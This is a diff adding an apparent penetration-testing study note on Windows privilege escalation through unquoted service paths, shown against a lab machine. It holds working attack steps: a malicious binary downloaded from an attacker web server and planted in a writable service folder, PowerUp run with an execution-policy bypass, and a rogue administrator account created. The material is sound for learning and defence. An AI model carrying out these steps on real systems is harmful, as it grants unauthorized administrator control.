@@ -821,3 +821,211 @@ The command completed successfully.
 ```
 
 ### Unquoted Service Paths
+
+We can use an Unquoted Service Path attack when we have Write permissions to a service's main directory or subdirectories but cannot replace files within them. If a Windows service is mapped to an executable that has a space and is not enclosed in quotes, we can leverage it.
+
+When services are started and processes are created for them, the Windows CreateProcess function is used, which has a first parameter of "IpApplicationName" that specifies the name and, optionally, the path to the exe. If the string provided has spaces and is unquoted, it is unclear to the function where the file name ends and the args begin. For every space in a file path, the funcntion uses the preceding part as file name by adding .exe and the rest as args. 
+
+Imaginve we have C:\Program Files\My Program\My Service\service.exe. Windows tries to start the executable service in this order:
+
+```
+C:\Program.exe
+C:\Program Files\My.exe
+C:\Program Files\My Program\My.exe
+C:\Program Files\My Program\My service\service.exe
+```
+
+We need to create a malicious exe, put it in the dir that corresponds to one of the interpreted paths, and match its name to the interpreted filename. Our file will get executed with the same privs as the service, once the service is started. This is often a LocalSystem account.
+
+Example: We could name our malicious exe Program.exe and put it in C:\, My.exe and put it in C:\Program Files\, or My.exe and put it in C:\Program Files\My Program\. The first two options require some unlikley perms because standard users can't usually write to these dirs. The third is most feasible since it is is the software's main dir.  If the dev set the perms for this dir too open, we can put our binary there.
+
+```console
+PS C:\Users\steve> Get-CimInstance -ClassName win32_service | Select Name,State,PathName 
+
+Name                      State   PathName
+----                      -----   --------
+...
+GammaService                             Stopped C:\Program Files\Enterprise Apps\Current Version\GammaServ.exe
+...
+```
+
+We found an unquoted service path with spaces. We could do this easier in cmd.exe with wmic:
+
+```console
+C:\Users\steve> wmic service get name,pathname |  findstr /i /v "C:\Windows\\" | findstr /i /v """
+Name                                       PathName                                                                     
+...                                                                                                         
+GammaService                               C:\Program Files\Enterprise Apps\Current Version\GammaServ.exe
+```
+
+Check if you have perms to start and stop the service.
+
+```console
+PS C:\Users\steve> Start-Service GammaService
+WARNING: Waiting for service 'GammaService (GammaService)' to start...
+
+PS C:\Users\steve> Stop-Service GammaService
+```
+
+Determine the order Windows will check for the exe of the service:
+
+```
+C:\Program.exe
+C:\Program Files\Enterprise.exe
+C:\Program Files\Enterprise Apps\Current.exe
+C:\Program Files\Enterprise Apps\Current Version\GammaServ.exe
+```
+
+Check your access rights to these files:
+
+```console
+PS C:\Users\steve> icacls "C:\"
+C:\ BUILTIN\Administrators:(OI)(CI)(F)
+    NT AUTHORITY\SYSTEM:(OI)(CI)(F)
+    BUILTIN\Users:(OI)(CI)(RX)
+    NT AUTHORITY\Authenticated Users:(OI)(CI)(IO)(M)
+    NT AUTHORITY\Authenticated Users:(AD)
+    Mandatory Label\High Mandatory Level:(OI)(NP)(IO)(NW)
+    
+Successfully processed 1 files; Failed processing 0 files
+    
+PS C:\Users\steve>icacls "C:\Program Files"
+C:\Program Files NT SERVICE\TrustedInstaller:(F)
+                 NT SERVICE\TrustedInstaller:(CI)(IO)(F)
+                 NT AUTHORITY\SYSTEM:(M)
+                 NT AUTHORITY\SYSTEM:(OI)(CI)(IO)(F)
+                 BUILTIN\Administrators:(M)
+                 BUILTIN\Administrators:(OI)(CI)(IO)(F)
+                 BUILTIN\Users:(RX)
+                 BUILTIN\Users:(OI)(CI)(IO)(GR,GE)
+                 CREATOR OWNER:(OI)(CI)(IO)(F)
+...
+
+Successfully processed 1 files; Failed processing 0 files
+
+PS C:\Users\steve> icacls "C:\Program Files\Enterprise Apps"
+C:\Program Files\Enterprise Apps NT SERVICE\TrustedInstaller:(CI)(F)
+                                 NT AUTHORITY\SYSTEM:(OI)(CI)(F)
+                                 BUILTIN\Administrators:(OI)(CI)(F)
+                                 BUILTIN\Users:(OI)(CI)(RX,W)
+                                 CREATOR OWNER:(OI)(CI)(IO)(F)
+                                 APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(OI)(CI)(RX)
+                                 APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES:(OI)(CI)(RX)
+
+Successfully processed 1 files; Failed processing 0 files
+```
+
+Built-in Users has write permissions to the third path. Put your malicious file name "Current.exe" here.
+
+We'll reuse our adduser.exe from our running python3 webserver.
+
+```console
+PS C:\Users\steve> iwr -uri http://192.168.119.3/adduser.exe -Outfile Current.exe
+
+PS C:\Users\steve> copy .\Current.exe 'C:\Program Files\Enterprise Apps\Current.exe'
+```
+
+Start the service and check the result.
+
+```console
+PS C:\Users\steve> Start-Service GammaService
+Start-Service : Service 'GammaService (GammaService)' cannot be started due to the following error: Cannot start
+service GammaService on computer '.'.
+At line:1 char:1
++ Start-Service GammaService
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : OpenError: (System.ServiceProcess.ServiceController:ServiceController) [Start-Service],
+   ServiceCommandException
+    + FullyQualifiedErrorId : CouldNotStartService,Microsoft.PowerShell.Commands.StartServiceCommand
+    
+PS C:\Users\steve> net user
+
+Administrator            BackupAdmin              dave
+dave2                    daveadmin                DefaultAccount
+Guest                    offsec                   steve
+WDAGUtilityAccount
+The command completed successfully.
+
+PS C:\Users\steve> net localgroup administrators
+...
+Members
+
+-------------------------------------------------------------------------------
+Administrator
+BackupAdmin
+dave2
+daveadmin
+offsec
+The command completed successfully.
+```
+
+Even though the service can't start, the executable is still runs our payload.
+
+To restore the original service, just stop the service, delete our binary, and start the service again.
+
+PowerUp may also be able to help.
+
+```console
+PS C:\Users\dave> iwr http://192.168.119.3/PowerUp.ps1 -Outfile PowerUp.ps1
+
+PS C:\Users\dave> powershell -ep bypass
+...
+
+PS C:\Users\dave> . .\PowerUp.ps1
+
+PS C:\Users\dave> Get-UnquotedService
+
+ServiceName    : GammaService
+Path           : C:\Program Files\Enterprise Apps\Current Version\GammaServ.exe
+ModifiablePath : @{ModifiablePath=C:\; IdentityReference=NT AUTHORITY\Authenticated Users;
+                 Permissions=AppendData/AddSubdirectory}
+StartName      : LocalSystem
+AbuseFunction  : Write-ServiceBinary -Name 'GammaService' -Path <HijackPath>
+CanRestart     : True
+
+ServiceName    : GammaService
+Path           : C:\Program Files\Enterprise Apps\Current Version\GammaServ.exe
+ModifiablePath : @{ModifiablePath=C:\; IdentityReference=NT AUTHORITY\Authenticated Users; Permissions=System.Object[]}
+StartName      : LocalSystem
+AbuseFunction  : Write-ServiceBinary -Name 'GammaService' -Path <HijackPath>
+CanRestart     : True
+```
+
+Try to use the AbuseFucntion that will create a new local user called john with the password Password123! and add john to the local Administrators group.
+
+```console
+PS C:\Users\steve> Write-ServiceBinary -Name 'GammaService' -Path "C:\Program Files\Enterprise Apps\Current.exe"
+
+ServiceName  Path                                         Command
+-----------  ----                                         -------
+GammaService C:\Program Files\Enterprise Apps\Current.exe net user john Password123! /add && timeout /t 5 && net loc...
+
+PS C:\Users\steve> Restart-Service GammaService
+WARNING: Waiting for service 'GammaService (GammaService)' to start...
+Restart-Service : Failed to start service 'GammaService (GammaService)'.
+At line:1 char:1
++ Restart-Service GammaService
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : OpenError: (System.ServiceProcess.ServiceController:ServiceController) [Restart-Service]
+   , ServiceCommandException
+    + FullyQualifiedErrorId : StartServiceFailed,Microsoft.PowerShell.Commands.RestartServiceCommand
+
+PS C:\Users\steve> net user
+
+User accounts for \\CLIENTWK220
+
+-------------------------------------------------------------------------------
+Administrator            BackupAdmin              dave
+dave2                    daveadmin                DefaultAccount
+Guest                    john            offsec
+steve                    WDAGUtilityAccount
+
+The command completed successfully.
+
+PS C:\Users\steve> net localgroup administrators
+...
+john
+...
+```
+
+## Abusing Other Windows Components
